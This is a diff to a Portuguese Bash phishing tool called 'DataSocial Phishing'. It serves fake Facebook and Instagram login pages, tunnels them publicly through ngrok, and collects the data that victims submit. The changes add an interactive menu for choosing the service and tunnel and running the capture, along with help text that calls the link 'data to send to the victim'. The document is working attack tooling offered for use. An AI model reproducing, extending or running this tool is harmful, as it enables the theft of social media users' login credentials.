@@ -36,7 +36,10 @@
 #     Adicionado instalador de requisitos caso necessário
 # v0.4 2023-01-08, Oliver Silva:
 #     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
-# v0.5 2023-03-19, Adicionado suporte a repetição do ataque
+# v0.5 2023-03-19, Oliver Silva:
+#     Adicionado suporte a repetição do ataque
+# v0.6 2023-03-31, Oliver Silva:
+#     Adicionado suporte ao modo interativo
 #
 # Licença: MIT License
 #
@@ -45,6 +48,7 @@
 # Versão 0.3: Instalador de requisitos
 # Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
 # Versão 0.5: Repetição do ataque caso precise
+# Versão 0.6: Modo interativo adicionado
 #
 
 trap interruptTwo SIGINT SIGTSTP
@@ -105,7 +109,7 @@ functionGroup() {
     processKill
     installReqIfNotExists
     listenLocalhost
-    banner
+
     echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
     showLink
 }
@@ -133,7 +137,6 @@ copyFiles() {
 
 tunnel() {
     if [ "$tunnel" == "ngrok" ] ; then
-        #verifySystemOs
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
         showLinkNgrok
@@ -213,7 +216,6 @@ get_data() {
 }
 
 banner() {
-clear
 echo -e "\e[34m
 	        '  
               '   '  TIOOLIVER | t.me/tiooliver_sh
@@ -232,14 +234,13 @@ echo -e "\e[34m
 }
 
 helper() {
-    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
+    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\n\t-i, \n\t--interactive\tInicia o programa em modo interativo\n\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
     exit 0
 }
 
 version() {
     echo -ne "$(basename "$0")"
     grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
-    exit 0
 }
 
 list() {
@@ -248,7 +249,6 @@ list() {
     for service in ${services[@]} ; do
 	echo -e "\e[0m\e[32m[√] $service\e[0m"
     done
-    exit 0
 }
 
 installReqIfNotExists() {
@@ -326,7 +326,6 @@ rerun() {
 	rerun
 
     elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
-	clear
 	interrupt > /dev/null && ./dataSocial.sh $args
 
     elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
@@ -344,14 +343,138 @@ if [ -z "$1" ] ; then
     exit 1
 fi
 
+# Modo janelas
+menu() {
+    while [ true ] ; do
+	echo -ne "\e[34;2;4mdsl\e[0m > \e[34;2m" ; read
+	if [ -z "$REPLY" ] ;then
+	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+	    menu
+	
+	elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
+	interrupt && exit 0
+
+	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
+	    echo -e "\n\n\t\e[0mhelp OR ?\tMostra esta tela de ajuda\n\tshow\t\tMostra todos os serviços\n\tuse service <S>\tUsa um serviço, substitua <S> pelo serviço\n\n"
+
+	elif [ "$REPLY" == "show" ] ; then
+	    list
+
+        elif [ "${REPLY:0:3}" == "use" ] ;then
+	    if [ "${REPLY:4:7}" == "service" ] ;then
+		if [ -n "${REPLY:12:8}" ] ;then 
+		    if [ "${REPLY:12}" == "facebook" -o "${REPLY:12}" == "instagram" ] ;then
+			service=${REPLY:12}
+		    	menuTunnel
+
+		    else
+			echo -e "\e[0m\e[33;1mServiço inválido\e[0m"
+		    fi
+
+	        else
+		    echo -e "\e[0m\e[33;1mErro, faltou o serviço!\e[0m"
+
+		fi
+
+	    else
+		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+
+	    fi
+
+        else
+	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+
+	fi
+    done
+    interrupt
+    exit 0
+}
+
+menuTunnel() {
+    tunnel="None"
+
+    while [ true ] ; do
+	echo -ne "\e[34;2;4mdsl\e[0m \e[34m<\e[31m$service\e[34m> \e[34;2m" ; read
+
+        if [ "${REPLY:0:4}" == "show" ] ;then	    
+            if [ "${REPLY:5:7}" == "options" ] ;then
+		echo -e "\n\n\t\e[0m\e[34;2mSelected service \e[32;2m=> \e[0m\t[\e[31m$service\e[0m]\n\t\e[34;2mSelected tunnel \e[32;2m=> \e[0m\t[\e[31m$tunnel\e[0m]\n\n"
+
+	    else
+		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+	    fi
+
+	elif [ "${REPLY:0:3}" == "set" ] ; then
+	    if [ "${REPLY:4:6}" == "tunnel" ] ;then
+		if [ -n "${REPLY:11}" ] ;then
+
+		    if [ "${REPLY:11}" == "ngrok" ] ;then
+		        tunnel=${REPLY:11}
+
+		    else
+			echo -e "\e[0m\e[33;1mTunel inválido\e[0m"
+		    fi
+
+		else
+		    tunnel="None"
+		    echo -e "\e[0m\e[33;1mErro, faltou o tunel!\e[0m"
+
+		fi
+
+	    else
+		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+	    fi
+
+	elif [ "$REPLY" == "run" ] ;then
+	    if [ -n "$service" -a -n "$tunnel" -a "$tunnel" == "ngrok" -o "$tunnel" == "ssh" ] ;then
+	        echo -e "\e[0mRunning external..."
+		args="--listen --service $service --tunnel $tunnel"
+		listen && tunnel && getDataCaptured
+
+	    elif [ -n "$service" -a "$tunnel" == "None" ] ;then
+		echo -e "\e[0mRunning local..."
+		args="--listen --service $service"
+		listen && getDataCaptured
+
+	    fi
+
+	elif [ "$REPLY" == "back" -o "$REPLY" == "return" ] ;then
+	    echo -e "\e[0m$REPLY => retornou ao inicio"
+	    menu
+
+	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
+	    echo -e "\n\n\t\e[0mshow options\tMostra as opçôes padrôes\n\tset tunnel\tDefine um tunel\n\trun\t\tExecuta o serviço definido\n\tback ou return\tRetorna ao menu inicial\n\n"
+	
+	else
+	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda\e[0m"
+	    
+        fi
+    done
+}
+
+banner_two() {
+    version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
+    dateUpdate=$(grep "^# v.*" dataSocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)
+
+    echo -e "\n\n"
+    toilet -f slant dataSocial --metal
+    echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m2\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
+    echo -e "\n\n"
+}
+
+interactiveMode() {
+    banner_two
+    menu
+}
+
 while [ -n "$1" ] ; do
     case "$1" in
 	-h | --help)
 	    helper;;
 	-v | --version)
-	    version;;
+	    version && exit 0;;
 	-L | --list)
-	    list;;
+	    list && exit 0;;
 	-s | --service)
 	    shift
 
@@ -376,6 +499,8 @@ while [ -n "$1" ] ; do
 	    tunnelKey=1
 	    tunnel="$1"
 	    ;;
+        -i | --interactive)
+	    interactiveMode;;
 
 	*)
 	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mOpção inválida: \e[33;1m$1\e[0m" && exit 1;;
@@ -384,10 +509,10 @@ while [ -n "$1" ] ; do
 done
 
 if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
-    listen && getDataCaptured
+    banner && listen && getDataCaptured
 
 elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
-    listen && tunnel && getDataCaptured
+    banner && listen && tunnel && getDataCaptured
 
 else
     echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mErro ao processar o comando, tente: \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara mais detalhes\e[0m"
